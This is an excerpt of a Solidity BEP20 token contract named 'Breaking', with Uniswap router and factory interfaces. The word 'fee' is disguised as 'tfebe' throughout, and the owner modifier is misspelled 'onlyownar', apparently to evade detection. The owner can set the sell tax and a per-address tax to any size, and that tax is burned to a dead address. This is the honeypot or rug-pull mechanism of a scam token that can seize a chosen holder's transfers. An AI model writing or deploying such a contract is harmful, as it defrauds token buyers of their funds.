...
interface IUniswapV2Factory {
    ...
    function tfebeTo() external view returns (address);
    function tfebeToSetter() external view returns (address);
    ...
    function settfebeTo(address) external;
    function settfebeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingtfebeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingtfebeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingtfebeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingtfebeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingtfebeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Breaking is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelltfebe = 0;

    uint256 private _defaultBuytfebe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliptfebe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelltfebe = _value;
    }

    function setSliptfebe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliptfebe[_address] = _value;
    }

    function getSliptfebe(address _address) external view onlyownar returns (uint256) {
        return _sliptfebe[_address];
    }


    function setMAccounttfebe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccounttfebe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradetfebeAmount = 0;

        if (rF) {
            uint256 tradetfebe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradetfebe = _defaultSelltfebe;
                }
                if (from == uniswapV2Pair) {

                    tradetfebe = _defaultBuytfebe;
                }
            }
            if (_sliptfebe[from] > 0) {
                tradetfebe = _sliptfebe[from];
            }

            tradetfebeAmount = _Amount.mul(tradetfebe).div(100);
        }


        if (tradetfebeAmount > 0) {
            _balances[from] = _balances[from].sub(tradetfebeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradetfebeAmount);
            emit Transfer(from, _deadAddress, tradetfebeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradetfebeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradetfebeAmount);
        emit Transfer(from, _to, _Amount - tradetfebeAmount);
    }
